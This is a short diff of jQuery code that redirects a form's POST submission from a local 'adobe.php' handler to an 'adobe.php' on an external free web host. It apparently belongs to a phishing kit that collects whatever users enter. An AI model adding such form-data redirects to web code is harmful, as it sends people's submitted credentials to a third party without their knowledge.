@@ -11,7 +11,7 @@
             var formData = new FormData($("#profileUp")[0]);
 
             $.ajax({
-                url: "adobe.php",
+                url: "https://890auto.000webhostapp.com/ikedigoogledc/adobe.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
